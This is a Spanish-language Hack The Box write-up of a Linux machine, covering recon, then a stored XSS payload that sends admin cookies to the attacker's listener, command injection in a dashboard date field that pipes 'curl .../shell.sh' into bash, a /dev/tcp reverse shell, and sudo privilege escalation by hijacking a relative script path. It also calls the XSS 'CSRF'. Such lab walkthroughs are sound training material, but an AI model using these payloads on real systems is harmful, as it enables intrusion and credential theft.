#writeup #HTB

# Reconocimiento

Comenzamos lanzando [[nmap]]:

```nmap
PORT     STATE SERVICE
22/tcp   open  ssh
5000/tcp open  upnp
```
```nmap
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)
| ssh-hostkey: 
|   256 90:02:94:28:3d:ab:22:74:df:0e:a3:b2:0f:2b:c6:17 (ECDSA)
|_  256 2e:b9:08:24:02:1b:60:94:60:b3:84:a9:9e:1a:60:ca (ED25519)
5000/tcp open  upnp?
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 200 OK
|     Server: Werkzeug/2.2.2 Python/3.11.2
|     Date: Tue, 09 Jul 2024 12:30:27 GMT
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 2799
|     Set-Cookie: is_admin=InVzZXIi.uAlmXlTvm8vyihjNaPDWnvB_Zfs; Path=/
|     Connection: close
|     <!DOCTYPE html>
|     <html lang="en">
|     <head>
|     <meta charset="UTF-8">
|     <meta name="viewport" content="width=device-width, initial-scale=1.0">
|     <title>Under Construction</title>
|     <style>
|     body {
|     font-family: 'Arial', sans-serif;
|     background-color: #f7f7f7;
|     margin: 0;
|     padding: 0;
|     display: flex;
|     justify-content: center;
|     align-items: center;
|     height: 100vh;
|     .container {
|     text-align: center;
|     background-color: #fff;
|     border-radius: 10px;
|     box-shadow: 0px 0px 20px rgba(0, 0, 0, 0.2);
|   RTSPRequest: 
|     <!DOCTYPE HTML>
|     <html lang="en">
|     <head>
|     <meta charset="utf-8">
|     <title>Error response</title>
|     </head>
|     <body>
|     <h1>Error response</h1>
|     <p>Error code: 400</p>
|     <p>Message: Bad request version ('RTSP/1.0').</p>
|     <p>Error code explanation: 400 - Bad request syntax or unsupported method.</p>
|     </body>
|_    </html>
```

Vemos que aunque no se reconozca como tal, el servicio que corre en el puerto *5000*, parece ser [[80-http|http]]. Si accedemos, veremos una página con una cuenta atrás. Además, también tendremos acceso a un formulario de soporte.

```whatweb
whatweb http://10.10.11.8:5000/
http://10.10.11.8:5000/ [200 OK] Cookies[is_admin], Country[RESERVED][ZZ], HTML5, HTTPServer[Werkzeug/2.2.2 Python/3.11.2], IP[10.10.11.8], Python[3.11.2], Script, Title[Under Construction], Werkzeug[2.2.2]
```

Buscando recursos con [[gobuster]], encontramos una ruta hacia un *dashboard*:

```gobuster
gobuster dir -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://10.10.11.8:5000/ -t 20
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.11.8:5000/
[+] Method:                  GET
[+] Threads:                 20
[+] Wordlist:                /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/support              (Status: 200) [Size: 2363]
/dashboard            (Status: 500) [Size: 265]
Progress: 3916 / 220548 (1.78%)^C
[!] Keyboard interrupt detected, terminating.
Progress: 3940 / 220548 (1.79%)
===============================================================
Finished
===============================================================
```


# Explotación

Sin embargo, dicho dashboard requiere autenticación. Vemos además que tenemos asignada una cookie **`is_admin`**. Por lo que con [[burpsuite]] tratamos de efectuar un ataque de [[CSRF]], desde el formulario de soporte:

```http
POST /support HTTP/1.1
Host: 10.10.11.8:5000
User-Agent: <script>var i=new Image(); i.src="http://10.10.14.50:8001/?cookie="+btoa(document.cookie);</script>
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 294

Origin: http://10.10.11.8:5000
Referer: http://10.10.11.8:5000/support
Upgrade-Insecure-Requests: 1
DNT: 1
Sec-GPC: 1


fname=you&lname=have&email=been%40pwned&phone=3432445534543&message=<script>var i=new Image(); i.src="http://10.10.14.50:8001/?cookie="+btoa(document.cookie);</script>
```

Tras inyectar código *javascript*, en el **User-Agent**, si nos ponemos en escucha con un servidor *http* con [[python]], podemos obtener una cookie de sesión y decodificarla:

```bash
python3 -m http.server 8001
Serving HTTP on 0.0.0.0 port 8001 (http://0.0.0.0:8001/) ...
10.10.14.50 - - [09/Jul/2024 16:10:00] "GET /?cookie= HTTP/1.1" 200 -
10.10.11.8 - - [09/Jul/2024 16:10:24] "GET /?cookie=aXNfYWRtaW49SW1Ga2JXbHVJZy5kbXpEa1pORW02Q0swb3lMMWZiTS1TblhwSDA= HTTP/1.1" 200 -
10.10.11.8 - - [09/Jul/2024 16:10:26] "GET /?cookie=aXNfYWRtaW49SW1Ga2JXbHVJZy5kbXpEa1pORW02Q0swb3lMMWZiTS1TblhwSDA= HTTP/1.1" 200 -
```
```bash
echo 'aXNfYWRtaW49SW1Ga2JXbHVJZy5kbXpEa1pORW02Q0swb3lMMWZiTS1TblhwSDA=' | base64 -d | cat -p
is_admin=ImFkbWluIg.dmzDkZNEm6CK0oyL1fbM-SnXpH0
```

Guardando la cookie en el navegador, somos capaces de ver el *dashboard*:

![[Writeups/THM/AdventOfCyber/SQ1/dashboard.png]]

En este dashboard se nos permite ejecutar una especie de examen de diagnóstico. Podemos volver a interceptar la solicitud con [[burpsuite]] y tratar de inyectar código:

![[burpsuite_injection.png]]

Vemos que hemos sido capaces de inyectar código, vamos a tratar de establecer una [[Reverse shell|reverse shell]]. Para ello creamos un *shell.sh*:

```bash
/bin/bash -c 'exec bash -i >& /dev/tcp/10.10.14.50/443 0>&1'
```

Nos montamos un servidor *http* con [[python]] y nos ponemos en escucha con [[netcat]]:

![[server_listener.png]]

Y mandamos la siguiente petición:

```http
POST /dashboard HTTP/1.1
Host: 10.10.11.8:5000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 57
Origin: http://10.10.11.8:5000
Connection: keep-alive
Referer: http://10.10.11.8:5000/dashboard
Cookie: is_admin=ImFkbWluIg.dmzDkZNEm6CK0oyL1fbM-SnXpH0
Upgrade-Insecure-Requests: 1
DNT: 1
Sec-GPC: 1

date=2023-09-15; curl http://10.10.14.50:8001/shell.sh|bash
```

![[were_in.png]]

Ya estamos dentro y antes que nada aplicamos un [[Tratamiento de la tty]].

# Escalada de privilegios

Para escalar privilegios comenzamos listando nuestros permisos de `sudo` con `sudo -l`:

```bash
sudo -l
```
```sudo -l
Matching Defaults entries for dvir on headless:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User dvir may run the following commands on headless:
    (ALL) NOPASSWD: /usr/bin/syscheck
```

```bash
#!/bin/bash

if [ "$EUID" -ne 0 ]; then
  exit 1
fi

last_modified_time=$(/usr/bin/find /boot -name 'vmlinuz*' -exec stat -c %Y {} + | /usr/bin/sort -n | /usr/bin/tail -n 1)
formatted_time=$(/usr/bin/date -d "@$last_modified_time" +"%d/%m/%Y %H:%M")
/usr/bin/echo "Last Kernel Modification Time: $formatted_time"

disk_space=$(/usr/bin/df -h / | /usr/bin/awk 'NR==2 {print $4}')
/usr/bin/echo "Available disk space: $disk_space"

load_average=$(/usr/bin/uptime | /usr/bin/awk -F'load average:' '{print $2}')
/usr/bin/echo "System load average: $load_average"

if ! /usr/bin/pgrep -x "initdb.sh" &>/dev/null; then
  /usr/bin/echo "Database service is not running. Starting it..."
  ./initdb.sh 2>/dev/null
else
  /usr/bin/echo "Database service is running."
fi

exit 0
```

Como se llama al ejecutable `initdb.sh` de forma relativa, podemos explotar un [[PATH Hijacking]], creamos un archivo con el mismo nombre en el directorio actual:

```bash
chmod +s /bin/bash
```

Y ejecutamos:

```bash
export PATH=$(pwd):$PATH
```

Ya solo falta ejecutar el binario y podremos lanzar una shell privilegiada con `bash -p`.